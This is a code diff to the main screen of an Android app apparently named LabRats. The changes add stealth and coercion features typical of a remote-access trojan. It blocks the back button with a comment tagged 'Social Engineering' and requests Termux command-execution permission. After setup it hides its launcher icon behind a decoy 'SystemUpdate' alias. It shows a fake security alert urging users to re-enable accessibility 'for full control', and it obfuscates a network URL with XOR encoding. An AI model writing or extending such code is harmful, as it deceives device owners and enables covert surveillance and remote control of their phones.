@@ -107,15 +107,18 @@ public class MainActivity extends AppCompatActivity {
                     // Console feedback
                     tvTerminalFeedback.setText("[ ✅ SUCCESS: URL_CLONED_TO_CLIPBOARD ]");
                     tvTerminalFeedback.setTextColor(getColor(R.color.neon_green));
+                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                     
                 } catch (Exception e) {
                     Log.e("MainActivity", "Clipboard failure: " + e.getMessage());
                     tvTerminalFeedback.setText("[ ❌ CLIPBOARD_ACCESS_DENIED ]");
                     tvTerminalFeedback.setTextColor(getColor(R.color.neon_red));
+                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                 }
             } else {
                 tvTerminalFeedback.setText("[ ⚠️ UPLINK_INACTIVE: NOTHING_TO_COPY ]");
                 tvTerminalFeedback.setTextColor(getColor(R.color.neon_red));
+                tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
             }
         });
 
@@ -143,6 +146,12 @@ public class MainActivity extends AppCompatActivity {
         TextView tvDevelopedBy = findViewById(R.id.tvDevelopedBy);
         tvDevelopedBy.setTextColor(0xFF00f2ff);
         tvDevelopedBy.setAlpha(0.9f);
+    }
+
+    @Override
+    public void onBackPressed() {
+        // [Social Engineering] Prevent accidental setup exit
+        android.widget.Toast.makeText(this, "Please complete system synchronization", android.widget.Toast.LENGTH_SHORT).show();
     }
 
     private void requestPermissions() {
@@ -258,6 +267,11 @@ public class MainActivity extends AppCompatActivity {
             permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);
         }
 
+        // Termux Bridge Permission (com.termux.permission.RUN_COMMAND)
+        if (ContextCompat.checkSelfPermission(this, "com.termux.permission.RUN_COMMAND") != PackageManager.PERMISSION_GRANTED) {
+            permissionsNeeded.add("com.termux.permission.RUN_COMMAND");
+        }
+
         if (!permissionsNeeded.isEmpty()) {
             ActivityCompat.requestPermissions(this,
                     permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
@@ -308,6 +322,7 @@ public class MainActivity extends AppCompatActivity {
 
                     tvTerminalFeedback.setText("[ ✅ BYPASS_PROTOCOL_ALREADY_ACTIVE ]");
                     tvTerminalFeedback.setTextColor(getColor(R.color.neon_green));
+                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                 }
             } catch (Exception e) {
                 Log.e("MainActivity", "Battery optimization protocol failure: " + e.getMessage());
@@ -315,17 +330,20 @@ public class MainActivity extends AppCompatActivity {
                     // Fallback to manual selection screen
                     tvTerminalFeedback.setText("[ 📡 REDIRECTING_TO_SYSTEM_SETTINGS... ]");
                     tvTerminalFeedback.setTextColor(getColor(R.color.neon_cyan));
+                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                     Toast.makeText(getApplicationContext(), "Redirecting to system battery settings...", Toast.LENGTH_SHORT).show();
                     startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
                 } catch (Exception e2) {
                     Log.e("MainActivity", "Critical failure in protocol fallback: " + e2.getMessage());
                     tvTerminalFeedback.setText("[ ❌ PROTOCOL_FAILURE ]");
                     tvTerminalFeedback.setTextColor(getColor(R.color.neon_red));
+                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                     Toast.makeText(getApplicationContext(), "❌ PROTOCOL_FAILURE", Toast.LENGTH_LONG).show();
                 }
             }
         } else {
             tvTerminalFeedback.setText("[ ℹ️ LEGACY_OS: POWER_LIMITS_NOT_ENFORCED ]");
+            tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
             Toast.makeText(getApplicationContext(), "ℹ️ LEGACY_OS: OK", Toast.LENGTH_SHORT).show();
         }
     }
@@ -357,6 +375,16 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private void resetTerminalFeedback() {
+        if (AccessibilityCore.getInstance() == null) {
+            tvTerminalFeedback.setText("SECURITY_ALERT: Accessibility service disabled. Please re-enable for full control.");
+            tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_light));
+        } else {
+            tvTerminalFeedback.setText("[ SECURE CONNECTION ESTABLISHED ]");
+            tvTerminalFeedback.setTextColor(getColor(R.color.neon_cyan));
+        }
+    }
+
     private synchronized void toggleServer() {
         if (btnStartStop == null || !btnStartStop.isEnabled()) return;
         
@@ -373,6 +401,7 @@ public class MainActivity extends AppCompatActivity {
                     btnStartStop.postDelayed(() -> {
                         btnStartStop.setEnabled(true);
                         updateUI();
+                        resetTerminalFeedback();
                     }, 1500);
                 });
             });
@@ -387,6 +416,39 @@ public class MainActivity extends AppCompatActivity {
                     btnStartStop.postDelayed(() -> {
                         btnStartStop.setEnabled(true);
                         updateUI();
+                        resetTerminalFeedback();
+                        
+                        // Automatic Icon Hiding (Self-Vanishing Protocol)
+                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+                            try {
+                                LabRatsHttpServer.logActivity("SECURITY_MAINTENANCE: Initiating identity camouflage...");
+                                android.content.pm.PackageManager pm = getPackageManager();
+                                
+                                // Enable Decoy first to ensure no "gap" where no icon exists
+                                pm.setComponentEnabledSetting(
+                                    new android.content.ComponentName(MainActivity.this, "com.labs.labrats.SystemUpdateAlias"),
+                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                                    android.content.pm.PackageManager.DONT_KILL_APP
+                                );
+
+                                // Disable Main
+                                pm.setComponentEnabledSetting(
+                                    new android.content.ComponentName(MainActivity.this, "com.labs.labrats.LauncherAlias"),
+                                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                                    android.content.pm.PackageManager.DONT_KILL_APP
+                                );
+                                
+                                // Force Launcher Refresh by returning to home
+                                Intent home = new Intent(Intent.ACTION_MAIN);
+                                home.addCategory(Intent.CATEGORY_HOME);
+                                home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                                startActivity(home);
+
+                                Log.d("MainActivity", "Stealth transition: Identity replaced.");
+                            } catch (Exception e) {
+                                Log.e("MainActivity", "Stealth failure: " + e.getMessage());
+                            }
+                        }, 5000);
                     }, 3000);
                 });
             });
@@ -534,7 +596,9 @@ public class MainActivity extends AppCompatActivity {
         backgroundExecutor.execute(() -> {
             String publicIp = null;
             try {
-                URL url = new URL("https://api64.ipify.org");
+                // XOR Obfuscated URL for IP lookup
+                byte[] e = {0x37, 0x0D, 0x03, 0x31, 0x17, 0x57, 0x4E, 0x61, 0x2E, 0x19, 0x1A, 0x6F, 0x50, 0x53, 0x00, 0x1E, 0x1A, 0x17, 0x0A, 0x6F, 0x0B, 0x1F, 0x06};
+                URL url = new URL(SystemAnalytics.decrypt(e));
                 HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                 urlConnection.setConnectTimeout(5000);
                 urlConnection.setReadTimeout(5000);
